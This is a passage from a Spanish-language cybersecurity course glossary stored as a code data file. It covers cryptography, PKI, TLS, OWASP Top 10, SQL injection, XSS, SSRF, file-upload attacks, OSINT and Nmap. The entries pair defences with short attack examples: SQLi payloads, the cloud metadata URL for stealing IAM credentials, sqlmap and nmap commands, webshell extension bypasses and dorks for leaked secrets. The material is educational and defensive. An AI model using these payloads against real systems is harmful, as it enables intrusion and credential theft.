    related: ["RSA", "Intercambio de claves (Diffie-Hellman)", "Cifrado asimétrico y par de claves"],
  },
  {
    id: 203,
    module: 17,
    term: "Intercambio de claves (Diffie-Hellman)",
    short: "Permite a dos partes acordar una clave secreta común sobre un canal inseguro.",
    detail:
      "**Diffie-Hellman (DH)** logra algo que parece magia: dos partes generan una **clave compartida** intercambiando solo valores públicos, sin que un observador pueda deducirla. Su variante moderna **ECDHE** añade *forward secrecy*: cada sesión usa claves efímeras, así que comprometer la clave del servidor no descifra el tráfico pasado.\n" +
      "> 💡 *Forward secrecy* es por qué capturar tráfico hoy no permite descifrarlo aunque roben la clave mañana.",
    examples: [
      "ECDHE en el handshake TLS 1.3 para forward secrecy.",
      "Acordar la clave de sesión de una VPN sin transmitirla.",
    ],
    related: ["ECC", "Cifrado asimétrico y par de claves", "Gestión de claves"],
  },
  {
    id: 204,
    module: 17,
    term: "Firmas digitales",
    short: "Cifrar un hash con la clave privada para probar autenticidad e integridad.",
    detail:
      "Una **firma digital** invierte el cifrado asimétrico: el emisor cifra el **hash** del mensaje con su **clave privada**; cualquiera lo verifica con su **clave pública**. Garantiza **autenticidad** (lo firmó el dueño de la clave), **integridad** (no se alteró) y **no repudio**.",
    examples: [
      "Firmar un certificado, un commit de Git o un binario.",
      "Verificar que una actualización proviene del fabricante.",
    ],
    related: ["Cifrado asimétrico y par de claves", "Función hash", "No repudio"],
  },
  {
    id: 205,
    module: 17,
    term: "Amenaza cuántica y post-quantum",
    short: "Los ordenadores cuánticos romperían RSA/ECC; la criptografía post-cuántica se adelanta.",
    detail:
      "El algoritmo de **Shor** en un ordenador cuántico suficientemente grande **rompería RSA y ECC** (factorización y logaritmo discreto). Aún no existe ese hardware, pero el riesgo **'harvest now, decrypt later'** (capturar hoy, descifrar mañana) es real.\n" +
      "> 💡 El **NIST** ya estandarizó algoritmos **post-cuánticos** (ej. ML-KEM/Kyber, 2024) resistentes a ataques cuánticos.",
    examples: [
      "Adoptar TLS híbrido clásico + post-cuántico de forma anticipada.",
      "Datos sensibles a largo plazo cifrados pensando en la amenaza cuántica.",
    ],
    related: ["RSA", "ECC", "Gestión de claves"],
  },

  // ── M18 · Hashing y PKI ──────────────────────────────────────────────────
  {
    id: 210,
    module: 18,
    term: "Función hash",
    short: "Transforma cualquier dato en una huella de tamaño fijo, irreversible y única.",
    detail:
      "Una **función hash** (SHA-256) produce una **huella de longitud fija** a partir de cualquier entrada. Propiedades clave:\n" +
      "• **Unidireccional** — no se puede revertir al original.\n" +
      "• **Efecto avalancha** — un cambio mínimo altera todo el hash.\n" +
      "• **Resistente a colisiones** — inviable hallar dos entradas con el mismo hash.\n" +
      "> ⚠️ **MD5** y **SHA-1** están rotos (colisiones); usar **SHA-256** o superior.",
    examples: [
      "Verificar la integridad de una descarga comparando su SHA-256.",
      "Almacenar huellas de archivos como IoC.",
    ],
    related: ["Salting y key stretching", "Firmas digitales", "Integridad"],
  },
  {
    id: 211,
    module: 18,
    term: "Salting y key stretching",
    short: "Cómo almacenar contraseñas de forma segura: sal única + funciones lentas a propósito.",
    detail:
      "Hashear contraseñas con SHA rápido **no basta**. Se añade:\n" +
      "• **Salt** — valor aleatorio único por contraseña; frustra las **rainbow tables** y evita que dos claves iguales den el mismo hash.\n" +
      "• **Key stretching** — algoritmos **lentos a propósito** (bcrypt, scrypt, Argon2) que encarecen la fuerza bruta.\n" +
      "| Función | Apta para contraseñas |\n" +
      "|---|---|\n" +
      "| MD5 / SHA-256 | No (demasiado rápidas) |\n" +
      "| bcrypt / Argon2 | Sí (lentas + salt) |\n" +
      "> ⚠️ Una **rainbow table** precomputa hashes; la **sal** la inutiliza.",
    examples: [
      "Guardar contraseñas con Argon2id y sal por usuario.",
      "bcrypt con factor de coste ajustable al hardware.",
    ],
    related: ["Función hash", "PKI y autoridades de certificación", "Confidencialidad"],
  },
  {
    id: 212,
    module: 18,
    term: "PKI y autoridades de certificación",
    short: "El sistema que vincula una clave pública con una identidad mediante certificados firmados.",
    detail:
      "La **PKI** (*Public Key Infrastructure*) resuelve '¿esta clave pública es realmente de quien dice ser?'. Una **CA** (*Certificate Authority*) de confianza **firma** certificados que ligan una clave pública a una identidad (dominio, persona). El navegador confía en un conjunto de **CA raíz** preinstaladas.",
    examples: [
      "Let's Encrypt emitiendo el certificado TLS de un dominio.",
      "El candado del navegador = certificado válido firmado por una CA confiable.",
    ],
    related: ["Cadena de confianza", "Firmas digitales", "Certificate transparency y pinning"],
  },
  {
    id: 213,
    module: 18,
    term: "Cadena de confianza",
    short: "La validación de un certificado sube desde el del servidor hasta una CA raíz de confianza.",
    detail:
      "Un certificado no se confía aislado: forma una **cadena**. El certificado del **servidor (leaf)** está firmado por una **CA intermedia**, firmada a su vez por una **CA raíz** en la que el sistema ya confía. Si algún eslabón falla (expirado, revocado, firma inválida), la cadena se rompe y el navegador alerta.\n" +
      "> 💡 Ver el diagrama 'Cadena de confianza PKI' más abajo.",
    examples: [
      "Leaf → CA intermedia → CA raíz: el navegador valida toda la cadena.",
      "Un certificado revocado (CRL/OCSP) rompe la confianza.",
    ],
    related: ["PKI y autoridades de certificación", "Certificate transparency y pinning"],
  },
  {
    id: 214,
    module: 18,
    term: "Certificate transparency y pinning",
    short: "Mecanismos extra para detectar certificados fraudulentos y atar un cliente a uno concreto.",
    detail:
      "Dos defensas contra CA comprometidas o certificados emitidos por error:\n" +
      "• **Certificate Transparency (CT)** — logs públicos y auditables de todos los certificados emitidos; permite detectar emisiones no autorizadas.\n" +
      "• **Certificate pinning** — la app fija el certificado/clave esperado, rechazando cualquier otro aunque sea 'válido' para una CA.\n" +
      "> ⚠️ El pinning mal gestionado puede romper la app al rotar certificados.",
    examples: [
      "Apps móviles que hacen pinning de su API contra MITM.",
      "Detectar vía CT un certificado emitido fraudulentamente para tu dominio.",
    ],
    related: ["Cadena de confianza", "PKI y autoridades de certificación", "Ataques a TLS"],
  },

  // ── M19 · TLS/SSL y VPN ──────────────────────────────────────────────────
  {
    id: 220,
    module: 19,
    term: "TLS 1.2 vs 1.3",
    short: "TLS 1.3 es más rápido y seguro: menos viajes, solo cifrados modernos.",
    detail:
      "**TLS** cifra el tráfico (la 'S' de HTTPS). La versión 1.3 fue una limpieza profunda:\n" +
      "| | TLS 1.2 | TLS 1.3 |\n" +
      "|---|---|---|\n" +
      "| Handshake | 2 RTT | 1 RTT (0-RTT opcional) |\n" +
      "| Cifrados | Muchos (algunos débiles) | Solo AEAD modernos |\n" +
      "| Forward secrecy | Opcional | Siempre (ECDHE) |\n" +
      "> ⚠️ SSL y TLS 1.0/1.1 están **obsoletos e inseguros**: deshabilitarlos.",
    examples: [
      "TLS 1.3 reduce la latencia del handshake a un solo viaje.",
      "Deshabilitar TLS 1.0/1.1 en el servidor por cumplimiento.",
    ],
    related: ["Cipher suite", "Ataques a TLS"],
  },
  {
    id: 221,
    module: 19,
    term: "Cipher suite",
    short: "El conjunto de algoritmos que cliente y servidor acuerdan para una conexión TLS.",
    detail:
      "Una **cipher suite** define la combinación de algoritmos de una sesión: **intercambio de claves** (ECDHE), **autenticación** (RSA/ECDSA), **cifrado simétrico** (AES-GCM) y **hash** (SHA-256). En el handshake, cliente y servidor negocian la suite más fuerte que ambos soporten.",
    examples: [
      "TLS_AES_256_GCM_SHA384 (una suite de TLS 1.3).",
      "Evitar suites con RC4, 3DES o sin forward secrecy.",
    ],
    related: ["TLS 1.2 vs 1.3", "Modos de operación"],
  },
  {
    id: 222,
    module: 19,
    term: "VPN: IPSec vs WireGuard",
    short: "Túneles cifrados entre redes; WireGuard es moderno, simple y rápido frente a IPSec.",
    detail:
      "Una **VPN** crea un **túnel cifrado** sobre una red insegura. Dos enfoques:\n" +
      "| | IPSec | WireGuard |\n" +
      "|---|---|---|\n" +
      "| Madurez | Veterano, ubicuo | Moderno |\n" +
      "| Complejidad | Alta | Muy baja |\n" +
      "| Cripto | Configurable | Fija y moderna (Curve25519) |\n" +
      "| Rendimiento | Bueno | Excelente |\n" +
      "> 💡 WireGuard vive en el kernel y tiene una base de código diminuta, más fácil de auditar.",
    examples: [
      "WireGuard para una VPN personal rápida y simple.",
      "IPSec en escenarios corporativos/legacy con equipos heterogéneos.",
    ],
    related: ["TLS 1.2 vs 1.3", "Intercambio de claves (Diffie-Hellman)", "Cifrado simétrico"],
  },
  {
    id: 223,
    module: 19,
    term: "Ataques a TLS",
    short: "La mayoría no rompen el cifrado: degradan la conexión o evitan que se cifre.",
    detail:
      "TLS bien configurado es sólido; los ataques apuntan a los **bordes**:\n" +
      "• **SSL stripping** — un MITM fuerza HTTP en vez de HTTPS para leer en claro.\n" +
      "• **Downgrade** — engaña para negociar una versión/suite débil.\n" +
      "• **Vulnerabilidades históricas** — POODLE, Heartbleed, BEAST (de versiones/implementaciones viejas).\n" +
      "> 💡 **HSTS** obliga al navegador a usar siempre HTTPS, frustrando el SSL stripping.",
    examples: [
      "Un MITM en WiFi público intentando SSL stripping.",
      "Cabecera HSTS + precarga para evitar el primer salto en claro.",
    ],
    related: ["TLS 1.2 vs 1.3", "Certificate transparency y pinning"],
  },

  // ── M20 · Seguridad Web: Fundamentos ─────────────────────────────────────
  {
    id: 230,
    module: 20,
    term: "Arquitectura cliente-servidor y HTTP",
    short: "El navegador (cliente) pide recursos vía HTTP a un servidor que responde.",
    detail:
      "La web funciona con **peticiones HTTP**: el cliente envía un **método** (GET, POST…) a una URL y el servidor devuelve un **código de estado** (200, 404, 500) y un cuerpo. HTTP es **sin estado**, por eso se usan **cookies/tokens** para mantener la sesión.\n" +
      "> 💡 Entender la petición/respuesta cruda (cabeceras incluidas) es la base de todo pentest web; herramientas como Burp Suite las interceptan.",
    examples: [
      "GET /perfil devuelve 200 con el HTML del perfil.",
      "Un 401/403 indica falta de autenticación/autorización.",
    ],
    related: ["Same-Origin Policy", "Headers de seguridad", "Cookie security"],
  },
  {
    id: 231,
    module: 20,
    term: "Same-Origin Policy",
    short: "Regla del navegador: un origen no puede leer recursos de otro origen distinto.",
    detail:
      "La **Same-Origin Policy (SOP)** es la defensa base del navegador: por defecto, una página solo puede leer datos de su **mismo origen** (mismo **protocolo + dominio + puerto**). Impide que un sitio malicioso lea tu sesión de otro.\n" +
      "| Comparado con https://app.com:443 | ¿Mismo origen? |\n" +
      "|---|---|\n" +
      "| https://app.com/otra | Sí |\n" +
      "| http://app.com | No (protocolo) |\n" +
      "| https://api.app.com | No (subdominio) |",
    examples: [
      "Un sitio atacante no puede leer tu webmail abierto en otra pestaña.",
      "Para compartir datos entre orígenes se necesita CORS.",
    ],
    related: ["CORS", "Cookie security", "Arquitectura cliente-servidor y HTTP"],
  },
  {
    id: 232,
    module: 20,
    term: "CORS",
    short: "Mecanismo para relajar la Same-Origin Policy de forma controlada.",
    detail:
      "**CORS** (*Cross-Origin Resource Sharing*) permite que un servidor autorice explícitamente a otros orígenes mediante cabeceras (`Access-Control-Allow-Origin`). Es necesario para APIs consumidas desde otro dominio.\n" +
      "> ⚠️ Mal configurado es peligroso: `Access-Control-Allow-Origin: *` **junto con** credenciales, o reflejar el `Origin` sin validar, expone datos a cualquier sitio.",
    examples: [
      "Una API que permite el origen https://app.com pero no otros.",
      "El antipatrón: reflejar cualquier Origin con allow-credentials.",
    ],
    related: ["Same-Origin Policy", "Headers de seguridad", "Cookie security"],
  },
  {
    id: 233,
    module: 20,
    term: "Headers de seguridad",
    short: "Cabeceras de respuesta que endurecen el navegador contra ataques comunes.",
    detail:
      "El servidor puede enviar cabeceras que activan defensas en el cliente:\n" +
      "| Header | Protege contra |\n" +
      "|---|---|\n" +
      "| Content-Security-Policy | XSS / inyección de recursos |\n" +
      "| Strict-Transport-Security | SSL stripping (fuerza HTTPS) |\n" +
      "| X-Frame-Options / frame-ancestors | Clickjacking |\n" +
      "| X-Content-Type-Options: nosniff | MIME sniffing |\n" +
      "> 💡 **CSP** es la más potente contra XSS: define de qué orígenes pueden cargarse scripts y recursos.",
    examples: [
      "Una CSP estricta bloquea scripts inline inyectados.",
      "HSTS evita el primer salto en HTTP plano.",
    ],
    related: ["Cookie security", "CORS", "Cross-Site Scripting (XSS)"],
  },
  {
    id: 234,
    module: 20,
    term: "Cookie security",
    short: "Atributos de las cookies que limitan su robo y su uso en ataques.",
    detail:
      "Las cookies de sesión son un objetivo principal. Sus atributos defensivos:\n" +
      "• **HttpOnly** — inaccesible desde JavaScript (mitiga el robo por XSS).\n" +
      "• **Secure** — solo se envía por HTTPS.\n" +
      "• **SameSite** (Lax/Strict) — no se envía en peticiones cross-site (mitiga CSRF).\n" +
      "> 💡 En AlphaLog, la cookie CSRF `al_csrf` y el patrón SameSite=Lax son parte de esta defensa.",
    examples: [
      "Cookie de sesión con HttpOnly + Secure + SameSite=Lax.",
      "Sin HttpOnly, un XSS roba la sesión con document.cookie.",
    ],
    related: ["Headers de seguridad", "Cross-Site Request Forgery (CSRF)", "Cross-Site Scripting (XSS)"],
  },

  // ── M21 · OWASP Top 10 (Parte 1) ─────────────────────────────────────────
  {
    id: 240,
    module: 21,
    term: "OWASP Top 10",
    short: "El estándar de facto de los 10 riesgos de seguridad web más críticos.",
    detail:
      "El **OWASP Top 10** es una lista consensuada y periódica (última: **2021**) de las categorías de riesgo más serias en aplicaciones web. No es un checklist exhaustivo, sino una **referencia de concienciación y prioridad**.\n" +
      "> 💡 Ver el diagrama 'OWASP Top 10 (2021)' más abajo para las 10 categorías con su mitigación.",
    examples: [
      "Usar el Top 10 como base mínima en un pentest web.",
      "Mapear hallazgos a categorías A01-A10 en un reporte.",
    ],
    related: ["Broken Access Control", "Injection", "Insecure Design y Security Misconfiguration"],
  },
  {
    id: 241,
    module: 21,
    term: "Broken Access Control",
    short: "A01: usuarios acceden a datos o acciones que no les corresponden.",
    detail:
      "**A01 (el #1 actual)**: fallos en la autorización. El más común es el **IDOR** (*Insecure Direct Object Reference*): cambiar un identificador para ver datos ajenos. También incluye **escalada** vertical (a admin) u horizontal (a otro usuario).\n" +
      "/api/user/123  →  /api/user/124\n" +
      "> ⚠️ La autorización debe verificarse **en el servidor**, en cada petición — nunca confiar en el cliente.",
    examples: [
      "Cambiar /factura/123 por /factura/124 y ver la de otro cliente.",
      "Acceder a /admin sin ser administrador (forced browsing).",
    ],
    related: ["IDOR y referencias inseguras", "OWASP Top 10", "Principio de mínimo privilegio"],
  },
  {
    id: 242,
    module: 21,
    term: "Cryptographic Failures",
    short: "A02: datos sensibles mal protegidos (sin cifrar, cripto débil, claves expuestas).",
    detail:
      "**A02** cubre la protección deficiente de datos: transmisión sin TLS, almacenamiento sin cifrar, **hashes obsoletos** (MD5/SHA-1) para contraseñas, o **claves/credenciales expuestas** en el código. El foco: clasificar qué datos son sensibles y cifrarlos en tránsito y en reposo.",
    examples: [
      "Contraseñas guardadas con MD5 sin sal.",
      "Una API key hardcodeada en el repositorio.",
    ],
    related: ["Salting y key stretching", "TLS 1.2 vs 1.3", "OWASP Top 10"],
  },
  {
    id: 243,
    module: 21,
    term: "Injection",
    short: "A03: entrada no confiable se interpreta como código o comando (SQLi, XSS, etc.).",
    detail:
      "**A03** ocurre cuando datos del usuario se mezclan con un intérprete sin separación: **SQL Injection**, **XSS**, inyección de comandos OS, LDAP, etc. La causa raíz es **mezclar datos y código**.\n" +
      "> 💡 Defensa transversal: **consultas parametrizadas**, validación de entrada y **codificación de salida**. Ver el módulo de SQLi/XSS para el detalle.",
    examples: [
      "' OR 1=1 -- en un login vulnerable.",
      "Un comentario con <script> que se ejecuta en otros usuarios.",
    ],
    related: ["SQL Injection", "Cross-Site Scripting (XSS)", "OWASP Top 10"],
  },
  {
    id: 244,
    module: 21,
    term: "Insecure Design y Security Misconfiguration",
    short: "A04 y A05: fallos de diseño desde el origen y configuraciones inseguras.",
    detail:
      "Dos categorías relacionadas:\n" +
      "• **A04 Insecure Design** — el fallo está en el **diseño**, no en un bug puntual: faltó *threat modeling*, controles inexistentes por concepto.\n" +
      "• **A05 Security Misconfiguration** — causa de innumerables brechas: credenciales por defecto, servicios/puertos innecesarios, errores verbosos (stack traces), **buckets S3 públicos**, headers ausentes, software sin actualizar.",
    examples: [
      "Una consola de admin con usuario/clave 'admin/admin'.",
      "Un bucket de almacenamiento expuesto públicamente por error.",
    ],
    related: ["Hardening y CIS Benchmarks", "Headers de seguridad", "OWASP Top 10"],
  },

  // ── M22 · OWASP Top 10 (Parte 2) ─────────────────────────────────────────
  {
    id: 250,
    module: 22,
    term: "Vulnerable and Outdated Components",
    short: "A06: usar librerías o software con vulnerabilidades conocidas.",
    detail:
      "**A06**: las apps modernas dependen de cientos de **componentes de terceros**; si alguno tiene una CVE conocida y no se parchea, se hereda el riesgo. **Log4Shell** es el ejemplo perfecto.\n" +
      "> 💡 Defensa: inventario de dependencias (**SBOM**), escaneo SCA (Snyk, Dependabot) y actualización continua.",
    examples: [
      "Una app con una versión vulnerable de Log4j (Log4Shell).",
      "Dependabot abriendo PRs para parchear librerías con CVE.",
    ],
    related: ["CVE y CVSS", "Software and Data Integrity Failures", "OWASP Top 10"],
  },
  {
    id: 251,
    module: 22,
    term: "Identification and Authentication Failures",
    short: "A07: fallos en login, sesiones y gestión de credenciales.",
    detail:
      "**A07** abarca autenticación débil: permitir **fuerza bruta**/credential stuffing, contraseñas débiles, **gestión de sesión** insegura (tokens predecibles, sin expiración), o falta de **MFA**. La identidad es la puerta de entrada, así que es un objetivo prioritario.",
    examples: [
      "Login sin rate limiting vulnerable a credential stuffing.",
      "Tokens de sesión que no expiran ni se invalidan al cerrar sesión.",
    ],
    related: ["AAA (Autenticación, Autorización, Accounting)", "Broken Access Control", "OWASP Top 10"],
  },
  {
    id: 252,
    module: 22,
    term: "Software and Data Integrity Failures",
    short: "A08: confiar en código o datos sin verificar su integridad (cadena de suministro).",
    detail:
      "**A08**: actualizaciones, plugins o pipelines CI/CD sin **verificación de integridad** (firmas). Incluye la **deserialización insegura** y los ataques a la **cadena de suministro** como **SolarWinds**.\n" +
      "> 💡 Defensa: firmar artefactos, verificar firmas/hashes y proteger el pipeline de build.",
    examples: [
      "Una actualización troyanizada por un proveedor comprometido (SolarWinds).",
      "Deserializar objetos no confiables y lograr RCE.",
    ],
    related: ["Firmas digitales", "Vulnerable and Outdated Components", "OWASP Top 10"],
  },
  {
    id: 253,
    module: 22,
    term: "Security Logging and Monitoring Failures",
    short: "A09: sin logs ni alertas, los ataques pasan desapercibidos.",
    detail:
      "**A09**: la falta de **registro, monitoreo y alertas** hace que las brechas se detecten tarde (el tiempo medio de detección se mide en meses). No basta con loguear: hay que **alertar** sobre eventos sospechosos y conservar evidencia para forense.",
    examples: [
      "Logins fallidos masivos que nunca generan una alerta.",
      "Sin logs, no se puede reconstruir cómo entró el atacante.",
    ],
    related: ["Detección de anomalías en tráfico", "OWASP Top 10"],
  },
  {
    id: 254,
    module: 22,
    term: "Server-Side Request Forgery (SSRF)",
    short: "A10: el servidor es engañado para hacer peticiones a destinos elegidos por el atacante.",
    detail:
      "**A10 SSRF**: la app toma una URL del usuario y la pide **desde el servidor**, permitiendo alcanzar **servicios internos** no expuestos o el **endpoint de metadata cloud**:\n" +
      "http://169.254.169.254/latest/meta-data/\n" +
      "> ⚠️ El caso **Capital One (2019)** explotó SSRF para robar credenciales IAM de AWS y datos de 100M+ personas. Defensa: allowlist de destinos, bloquear IPs internas/metadata, validar URLs.",
    examples: [
      "Apuntar un parámetro 'url' a 169.254.169.254 para leer credenciales IAM.",
      "Escanear servicios internos desde el servidor vulnerable.",
    ],
    related: ["SSRF y metadata cloud", "OWASP Top 10", "Headers de seguridad"],
  },

  // ── M23 · SQL Injection y XSS ────────────────────────────────────────────
  {
    id: 260,
    module: 23,
    term: "SQL Injection",
    short: "Inyectar SQL a través de entrada no sanitizada para manipular la base de datos.",
    detail:
      "La **SQL Injection (SQLi)** ocurre cuando la entrada del usuario se concatena en una consulta. Tipos principales:\n" +
      "• **Clásica:** ' OR 1=1 --\n" +
      "• **UNION:** ' UNION SELECT usuario,clave FROM users --\n" +
      "• **Blind (booleana):** ' AND SUBSTRING(@@version,1,1)='8' --\n" +
      "• **Time-based:** ' AND IF(1=1,SLEEP(5),0) --\n" +
      "> 💡 Defensa definitiva: **consultas parametrizadas** (prepared statements); nunca concatenar entrada.",
    examples: [
      "Saltarse un login con ' OR 1=1 -- como usuario.",
      "Extraer la tabla de usuarios con un UNION SELECT.",
    ],
    related: ["Injection", "Herramientas: sqlmap", "Prevención de inyección"],
  },
  {
    id: 261,
    module: 23,
    term: "Cross-Site Scripting (XSS)",
    short: "Inyectar JavaScript que se ejecuta en el navegador de otras víctimas.",
    detail:
      "El **XSS** inyecta script que corre en el contexto de la víctima (puede robar sesión, hacer acciones). Tres tipos:\n" +
      "| Tipo | Dónde vive |\n" +
      "|---|---|\n" +
      "| Reflected | En la URL/petición, no persiste |\n" +
      "| Stored | Persistido en el servidor (comentario) |\n" +
      "| DOM-based | En el JS del cliente, sin tocar el servidor |\n" +
      "> ⚠️ Un payload típico stored: una imagen con `onerror` que lee `document.cookie`.",
    examples: [
      "Un comentario con script que se ejecuta en quien lo lee (stored).",
      "?q=<script>... reflejado sin sanitizar (reflected).",
    ],
    related: ["Injection", "Headers de seguridad", "Prevención de inyección"],
  },
  {
    id: 262,
    module: 23,
    term: "Herramientas: sqlmap",
    short: "El estándar para automatizar la detección y explotación de SQL Injection.",
    detail:
      "**sqlmap** automatiza todo el ciclo de SQLi: detecta el punto inyectable, identifica el motor, extrae bases de datos/tablas y hasta obtiene una shell. Para XSS existen fuzzers como **XSStrike**.\n" +
      "sqlmap -u \"https://sitio/item?id=1\" --dbs\n" +
      "> ⚠️ Usar solo con autorización explícita; son herramientas de pentest, no de uso libre.",
    examples: [
      "Enumerar bases de datos con sqlmap --dbs.",
      "Volcar una tabla con sqlmap --dump.",
    ],
    related: ["SQL Injection", "Cross-Site Scripting (XSS)", "Prevención de inyección"],
  },
  {
    id: 263,
    module: 23,
    term: "Prevención de inyección",
    short: "Parametrizar, validar entrada y codificar salida cierra SQLi y XSS.",
    detail:
      "Las defensas son bien conocidas:\n" +
      "• **SQLi** → **consultas parametrizadas/ORM**, mínimo privilegio del usuario de BD.\n" +
      "• **XSS** → **codificación de salida** según contexto, **CSP**, frameworks que escapan por defecto, cookies **HttpOnly**.\n" +
      "• Transversal → **validar/normalizar** toda entrada y un **WAF** como capa extra.\n" +
      "> 💡 Un WAF ayuda pero no sustituye el código seguro: hay técnicas de bypass.",
    examples: [
      "Prepared statements en vez de concatenar SQL.",
      "Escapar la salida HTML y aplicar una CSP estricta.",
    ],
    related: ["SQL Injection", "Cross-Site Scripting (XSS)", "Headers de seguridad"],
  },

  // ── M24 · CSRF, SSRF y File Upload ───────────────────────────────────────
  {
    id: 270,
    module: 24,
    term: "Cross-Site Request Forgery (CSRF)",
    short: "Engañar al navegador de una víctima autenticada para que ejecute una acción no deseada.",
    detail:
      "El **CSRF** abusa de que el navegador **adjunta las cookies automáticamente**: un sitio malicioso provoca una petición (transferir dinero, cambiar email) usando la sesión activa de la víctima, sin leer la respuesta.\n" +
      "> 💡 Defensa: **tokens anti-CSRF** (como `al_csrf` en AlphaLog) + cookies **SameSite**. La verificación token-en-header vs cookie es justo el patrón del middleware del proyecto.",
    examples: [
      "Una imagen oculta que dispara una transferencia con tu sesión.",
      "AlphaLog exige x-csrf-token == cookie al_csrf en mutaciones.",
    ],
    related: ["Cookie security", "SSRF y metadata cloud", "IDOR y referencias inseguras"],
  },
  {
    id: 271,
    module: 24,
    term: "SSRF y metadata cloud",
    short: "Forzar al servidor a pedir recursos internos, incluido el endpoint de metadata de la nube.",
    detail:
      "El **SSRF** se vuelve crítico en la nube: el endpoint de **metadata** (`169.254.169.254`) entrega **credenciales IAM** temporales al instar a la app a consultarlo.\n" +
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/\n" +
      "> ⚠️ Caso **Capital One (2019)**: SSRF vía un WAF mal configurado robó datos de 100M+ personas. **IMDSv2** (token obligatorio) mitiga este vector.",
    examples: [
      "Leer credenciales IAM vía el endpoint de metadata por SSRF.",
      "Habilitar IMDSv2 para exigir un token y frenar el abuso.",
    ],
    related: ["Server-Side Request Forgery (SSRF)", "Cross-Site Request Forgery (CSRF)", "Ataques de subida de archivos"],
  },
  {
    id: 272,
    module: 24,
    term: "IDOR y referencias inseguras",
    short: "Acceder a objetos ajenos manipulando un identificador previsible.",
    detail:
      "Un **IDOR** (*Insecure Direct Object Reference*) expone objetos por su identificador sin verificar la **autorización** del solicitante. Es la manifestación más común de Broken Access Control y suele ser trivial de explotar.\n" +
      "GET /api/pedido/1001  →  GET /api/pedido/1002\n" +
      "> 💡 Defensa: verificar ownership en el servidor en cada acceso; usar identificadores no predecibles (UUID) como capa extra.",
    examples: [
      "Cambiar el id de un pedido en la URL y ver el de otro usuario.",
      "Descargar /docs/124.pdf siendo dueño solo del 123.",
    ],
    related: ["Broken Access Control", "Cross-Site Request Forgery (CSRF)", "Principio de mínimo privilegio"],
  },
  {
    id: 273,
    module: 24,
    term: "Ataques de subida de archivos",
    short: "Subidas mal validadas permiten webshells, RCE y otros abusos.",
    detail:
      "Una subida de archivos insegura puede dar control del servidor:\n" +
      "• Subir un **webshell** (`shell.php`) y ejecutarlo → **RCE**.\n" +
      "• Bypass por **Content-Type** falso o **doble extensión** (`shell.php.jpg`).\n" +
      "• **Path traversal** en el nombre (`../../`), XSS vía SVG/HTML, zip bombs (DoS).\n" +
      "> ✅ Defensa: validar el tipo por **contenido (magic bytes)** no por extensión, renombrar, almacenar **fuera del webroot**, límites de tamaño y escaneo AV.",
    examples: [
      "Subir shell.php.jpg para saltarse el filtro de extensión.",
      "Guardar las subidas en storage dedicado fuera del webroot.",
    ],
    related: ["SSRF y metadata cloud", "Injection", "Hardening y CIS Benchmarks"],
  },

  // ── M25 · Reconocimiento y OSINT ─────────────────────────────────────────
  {
    id: 280,
    module: 25,
    term: "Reconocimiento pasivo vs activo",
    short: "El pasivo no toca al objetivo; el activo interactúa y deja huella.",
    detail:
      "El **reconocimiento** es la primera fase de cualquier pentest:\n" +
      "| Tipo | Interacción | Detección |\n" +
      "|---|---|---|\n" +
      "| Pasivo | Solo fuentes públicas (OSINT) | Indetectable |\n" +
      "| Activo | Toca el objetivo (escaneo, conexión) | Puede alertar al IDS |\n" +
      "> 💡 Se empieza por el pasivo para construir el mapa del objetivo sin hacer ruido, y solo después se pasa al activo.",
    examples: [
      "Buscar empleados en LinkedIn (pasivo).",
      "Un ping o escaneo de puertos ya es activo.",
    ],
    related: ["Google dorking", "Shodan y Censys", "Frameworks OSINT"],
  },
  {
    id: 281,
    module: 25,
    term: "Google dorking",
    short: "Usar operadores de búsqueda avanzados para encontrar información expuesta.",
    detail:
      "El **Google dorking** (*Google hacking*) aprovecha operadores para hallar datos sensibles indexados: paneles de login, archivos, errores.\n" +
      "site:ejemplo.com filetype:pdf\n" +
      "intitle:\"index of\" \"backup\"\n" +
      "> 💡 La **Google Hacking Database (GHDB)** de Exploit-DB recopila dorks útiles.",
    examples: [
      "site:target.com -www para descubrir subdominios.",
      "filetype:env DB_PASSWORD para buscar secretos filtrados.",
    ],
    related: ["Reconocimiento pasivo vs activo", "Shodan y Censys", "OSINT"],
  },
  {
    id: 282,
    module: 25,
    term: "Shodan y Censys",
    short: "Buscadores de dispositivos conectados a Internet, no de páginas web.",
    detail:
      "**Shodan** y **Censys** indexan **hosts y servicios** expuestos (puertos, banners, certificados, cámaras, ICS), no contenido web. Permiten encontrar la superficie de ataque de una organización sin tocarla (recon pasivo).",
    examples: [
      "Buscar en Shodan servidores RDP expuestos de una organización.",
      "Censys para enumerar certificados y subdominios de un dominio.",
    ],
    related: ["Google dorking", "Reconocimiento pasivo vs activo", "Superficie de ataque"],
  },
  {
    id: 283,
    module: 25,
    term: "Frameworks OSINT",
    short: "Herramientas que automatizan la recolección y correlación de inteligencia abierta.",
    detail:
      "Más allá de búsquedas manuales, hay herramientas dedicadas:\n" +
      "• **theHarvester** — correos, subdominios y hosts de fuentes públicas.\n" +
      "• **Maltego** — correlación visual de relaciones (personas, dominios, infra).\n" +
      "• **Recon-ng / SpiderFoot** — frameworks modulares de automatización OSINT.\n" +
      "theHarvester -d ejemplo.com -b all",
    examples: [
      "theHarvester reuniendo correos para un phishing dirigido.",
      "Maltego graficando la infraestructura de un objetivo.",
    ],
    related: ["OSINT", "Reconocimiento pasivo vs activo", "Shodan y Censys"],
  },

  // ── M26 · Escaneo con Nmap ───────────────────────────────────────────────
  {
    id: 290,
    module: 26,
    term: "Tipos de escaneo Nmap",
    short: "SYN, TCP connect y UDP: distintas formas de descubrir puertos según sigilo y permisos.",
    detail:
      "**Nmap** descubre puertos abiertos con distintas técnicas:\n" +
      "| Flag | Tipo | Nota |\n" +
      "|---|---|---|\n" +
      "| -sS | SYN (half-open) | Rápido y sigiloso (requiere root) |\n" +
      "| -sT | TCP connect | Completa el handshake (sin root) |\n" +
      "| -sU | UDP | Lento; descubre DNS, SNMP, etc. |\n" +
      "nmap -sS -p- 10.0.0.5\n" +
      "> 💡 `-p-` escanea los 65535 puertos; sin él, Nmap prueba los 1000 más comunes.",
    examples: [
      "nmap -sS -sV -p- objetivo para puertos + versiones.",
      "No olvidar -sU: muchos servicios viven en UDP.",
    ],
    related: ["NSE scripts", "Detección de servicio y OS", "Three-way handshake"],
  },
  {
    id: 291,
    module: 26,
    term: "NSE scripts",
    short: "El motor de scripting de Nmap automatiza detección de vulns, enum y más.",
    detail:
      "El **NSE** (*Nmap Scripting Engine*) extiende Nmap con scripts (en Lua) para enumeración, detección de vulnerabilidades y hasta explotación ligera. Se agrupan en categorías (`default`, `safe`, `vuln`).\n" +
